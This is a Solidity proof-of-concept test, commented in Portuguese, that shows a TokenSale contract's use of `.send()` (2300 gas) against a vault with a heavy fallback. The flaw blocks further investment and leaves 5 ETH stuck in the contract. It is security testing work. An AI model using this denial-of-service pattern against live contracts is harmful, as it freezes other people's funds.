// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.6.2;

import "../contracts/sale/TokenSale.sol";
import "../contracts/asgard-proptests/mocks/MockSaleToken.sol";
import "../contracts/asgard-proptests/mocks/HeavyFallbackVault.sol";

/**
 * PoC (executável) — TokenSale `.send()` (2300 gas) trava a venda + prende ETH.
 *
 * Cenário:
 *  1. etherVault = HeavyFallbackVault (contrato cujo fallback consome >2300 gas).
 *  2. Investir 5 ETH (abaixo de maxEtherBalance=10 ETH) funciona.
 *  3. Investir +6 ETH (saldo >10 ETH) dispara `_rebalance`, que faz
 *     `require(etherVault.send(balance), "TS03")` → `.send()` retorna false → revert.
 *  4. `withdrawEther` (também `.send()`) reverte → os 5 ETH ficam presos.
 */
contract TokenSaleSendDoSTest {
    TokenSale public sale;
    MockSaleToken public token;
    HeavyFallbackVault public vault;

    function test_send_DoS() external {
        bool investReverted;
        bool withdrawReverted;

        token = new MockSaleToken();
        vault = new HeavyFallbackVault();
        sale = new TokenSale();

        // funda o tokenVault (o próprio contrato de teste) com tokens suficientes
        token.mint(address(this), 10**30);

        // initialize(owner, token, etherVault, tokenVault, refCurrency, refCurrencyDecimals)
        sale.initialize(address(this), address(token), address(vault), address(this), "CHF", 2);

        // abre a venda (startAt=0 satisfaz beforeOpen; endAt distante satisfaz isOpen)
        sale.setSchedule(0, 2**64);

        // investir 5 ETH (<= maxEtherBalance=10 ETH) — funciona
        sale.investEther{value: 5 ether}();
        assert(address(sale).balance == 5 ether);

        // investir +6 ETH (saldo viraria 11 > 10) — _rebalance usa .send() e reverte TS03
        investReverted = false;
        try sale.investEther{value: 6 ether}() {
            // não deveria chegar aqui
        } catch {
            investReverted = true;
        }
        assert(investReverted);
        assert(address(sale).balance == 5 ether); // os 6 ETH foram revertidos

        // os 5 ETH ficam PRESOS: withdrawEther também usa .send() e reverte
        withdrawReverted = false;
        try sale.withdrawEther() {
            // não deveria chegar aqui
        } catch {
            withdrawReverted = true;
        }
        assert(withdrawReverted);
        assert(address(sale).balance == 5 ether); // ETH continua preso no contrato
    }
}
